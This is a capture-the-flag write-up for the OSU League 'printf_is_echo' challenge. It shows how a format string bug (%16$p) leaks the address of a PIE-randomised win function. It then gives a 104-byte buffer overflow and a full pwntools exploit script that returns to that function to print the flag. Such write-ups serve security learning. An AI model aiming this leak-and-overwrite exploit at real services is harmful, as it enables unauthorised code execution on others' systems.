---
title: "OSU League 2020/2021 - printf_is_echo Writeup"
date: 2020-11-04
draft: false
description: ""
tags: ["ctf"]
---
## Writeup
Oh boy. We got by the title what looks to be some sort of challenge involving printf.  Let's run the binary and take a look.

```
did you know the unix tool echo can be implemented with two lines of C? I'll echo some bytes, try it!
boop
boop

I used ASLR (with PIE), so the address of the win function is randomized!
I'll give you the last three hex digits of the address as a hint: 0x79a
Type "I give up" to acknowledge that this binary is unhackable
I give up
```

Uh oh, so ASLR is enabled.  This means we don't know what the address of the win function will be since it changes every time.  If only there was a way to leak addresses from the stack, we might be able to get something.  Well, maybe we can.  

If the `printf` is used in an insecure way, directly passing user controled variables as arguments to the funtion, then we can make really bad things happen.

For example.  What would happen if we have a printf function like this:
`printf(userinput);`
and we passed in `%p`?

Well, it will treat the `%p` as an argument and print the pointer data on the stack.  Let's try it out with the program.

```
%p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p
0x7ffdc72101a0, 0x7fb27237f8d0, 0xf, (nil), 0x7fb2725934c0, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, (nil), 0x5646bc24d79a, 0x5646bc24d690, 0x7ffdc7210210,
I used ASLR (with PIE), so the address of the win function is randomized!
I'll give you the last three hex digits of the address as a hint: 0x79a
```

Well sweet, looks like we got some leaked addresses.  Not only that, but there is an address in the 16th spot that ends in `0x79a`. That's our win function!!

We can make this a bit cleaner by just inputing `%16$p`.  Let's verify this works and we get the right address.

```
did you know the unix tool echo can be implemented with two lines of C? I'll echo some bytes, try it!
%16$p
0x557959a5079a

I used ASLR (with PIE), so the address of the win function is randomized!
I'll give you the last three hex digits of the address as a hint: 0x79a
Type "I give up" to acknowledge that this binary is unhackable
```

Awesome.  Next step now that we have the win function is to try to get our program to return to it. This will probably be accomplised via a buffer overflow attack on the second input option. And after messing around a bit, I was able to find that the buffer we had was going to be 104 bytes before we started overwriting the instruction pointer:

```
gdb-peda$ r
Starting program: /home/perchik/CTF/osuleague/week4/printf_is_echo
did you know the unix tool echo can be implemented with two lines of C? I'll echo some bytes, try it!
boop
boop

I used ASLR (with PIE), so the address of the win function is randomized!
I'll give you the last three hex digits of the address as a hint: 0x79a
Type "I give up" to acknowledge that this binary is unhackable
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0xf
RDX: 0x7ffff7dd18d0 --> 0x0
RSI: 0x7fffffffde80 ('A' <repeats 96 times>, "BBBBBBBB\n")
RDI: 0x7fffffffde81 ('A' <repeats 95 times>, "BBBBBBBB\n")
RBP: 0x4242424242424242 ('BBBBBBBB')
```

So, we have a way of getting the address of win(), we know our padding size. We can now build an exploit!

```python
from pwn import *
import os, sys
#io = process('./printf_is_echo')
io = remote('ctf.ropcity.com', 31338)

context(arch = "amd64")

io.recvuntil("try it!\n")

printf = "%16$p"

io.sendline(printf)

win = int(io.recvline(), 16)
log.info(win)

padding = b'A'*104
io.recvuntil('unhackable')
payload = padding + p64(win)

io.sendline(payload)
io.interactive()
```

And after running it we get the flag!

```
[+] Opening connection to ctf.ropcity.com on port 31338: Done
[*] 94681416755098
[*] Switching to interactive mode

osu{F0rMa7_$tRing_1s_FUN}
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x03
[*] Got EOF while reading in interactive
```
Nice! That was a fun challenged and learned a lot about how format string vulns work!